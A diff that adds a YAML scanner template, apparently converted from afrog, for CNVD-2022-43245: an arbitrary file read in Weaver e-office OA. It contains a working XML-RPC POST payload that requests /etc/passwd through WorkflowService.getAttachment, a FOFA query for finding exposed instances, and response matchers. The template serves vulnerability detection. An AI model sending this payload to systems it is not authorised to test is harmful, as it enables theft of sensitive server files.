@@ -1,0 +1,35 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - body: |
+      <?xml version="1.0" encoding="UTF-8"?><methodCall>
+      <methodName>WorkflowService.getAttachment</methodName>
+      <params><param><value><string>/etc/passwd</string>
+      </value></param></params></methodCall>
+    headers:
+      Content-Type: application/xml
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - <methodResponse><params><param><value><base64>
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}/weaver/org.apache.xmlrpc.webserver.XmlRpcServlet'
+id: CNVD-2022-43245
+info:
+  author: SleepingBag945
+  description: |-
+    e-office is a standard collaborative mobile office platform. Ltd. e-office has an arbitrary file reading vulnerability, which can be exploited by attackers to obtain sensitive information.
+    fofa: app="泛微-协同办公OA"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: Weaver OA XmlRpcServlet - Arbitary File Read
+  severity: high
+  tags: cnvd,cnvd2022,weaver,e-office,oa,lfi,argus-import
